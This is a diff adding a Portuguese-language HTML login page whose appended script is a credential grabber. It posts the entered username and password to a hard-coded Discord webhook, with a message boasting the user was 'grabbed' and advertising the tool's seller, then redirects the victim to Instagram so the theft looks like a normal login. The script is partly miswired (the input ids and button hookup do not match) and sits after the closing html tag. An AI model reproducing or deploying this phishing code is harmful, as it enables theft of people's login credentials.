@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tela de login</title>
+    <style>
+        body{
+            font-family: Arial, Helvetica, sans-serif;
+            background-image: linear-gradient(45deg, cyan, yellow);
+        }
+        div{
+            background-color: rgba(0, 0, 0, 0.9);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%,-50%);
+            padding: 80px;
+            border-radius: 15px;
+            color: #fff;
+        }
+        input{
+            padding: 15px;
+            border: none;
+            outline: none;
+            font-size: 15px;
+        }
+        button{
+            background-color: dodgerblue;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 10px;
+            color: white;
+            font-size: 15px;
+            
+        }
+        button:hover{
+            background-color: deepskyblue;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Login</h1>
+        <input type="text" placeholder="Nome">
+        <br><br>
+        <input type="password" placeholder="Senha">
+        <br><br>
+        <button>Enviar</button>
+    </div>
+</body>
+</html>
+
+<script>
+    function login() {
+        const username = document.getElementById('username').value; 
+        const password = document.getElementById('password').value;
+
+        // Verificar se os campos estão vazios
+        if (!username || !password) {
+            alert('Por favor, preencha todos os campos.');
+            return; // Impede o envio se os campos estiverem vazios
+        }
+
+        // Enviar as credenciais para o webhook do Discord
+        const webhookUrl = 'https://discord.com/api/webhooks/1322009369239617546/52wE5P2l6X4SrrJaTdkmee4ZffzXdRs4QcMaf8lFjrY0Mz4WhD93RNDvQen6Jqsl7qP4'; 
+        const data = {
+            content: `# Usuário Grabbado com sucesso:\nSuposto Login: ||${username}||\nSuposta senha: ||${password}||\n\n\n GRABBER FEITO POR BANIDOS.SHOP. ADQUIRA O GRABBER: [BANIDOS.SHOP ](https://banidos.shop/) /` 
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.ok) {
+                window.location.href = 'https://www.instagram.com';
+            } else {
+                alert('Erro ao enviar as credenciais: ' + response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Erro:', error);
+        });
+    }
+</script>
+</body>
+</html>
